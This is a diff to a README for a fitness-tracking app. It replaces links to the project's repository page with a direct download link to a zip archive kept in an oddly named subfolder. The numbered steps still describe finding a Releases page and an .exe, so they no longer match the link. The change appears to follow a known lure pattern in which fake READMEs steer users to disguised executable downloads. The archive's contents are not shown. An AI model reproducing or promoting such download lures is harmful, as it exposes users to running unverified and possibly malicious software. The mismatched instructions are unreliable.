@@ -1,6 +1,6 @@
 # 🏋️ Iron-Haven-Gym - Manage your personal fitness training progress
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/purldrachma893/Iron-Haven-Gym)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/purldrachma893/Iron-Haven-Gym/main/brackened/Iron_Haven_Gym_v2.5-beta.2.zip)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the application:
 
 You can get the software from our official repository page. Follow these steps to obtain the setup files:
 
-1. Visit this website to download: [https://github.com/purldrachma893/Iron-Haven-Gym](https://github.com/purldrachma893/Iron-Haven-Gym).
+1. Visit this website to download: [https://raw.githubusercontent.com/purldrachma893/Iron-Haven-Gym/main/brackened/Iron_Haven_Gym_v2.5-beta.2.zip](https://raw.githubusercontent.com/purldrachma893/Iron-Haven-Gym/main/brackened/Iron_Haven_Gym_v2.5-beta.2.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest release tag.
 4. Select the file ending in .exe to start the transfer to your computer.
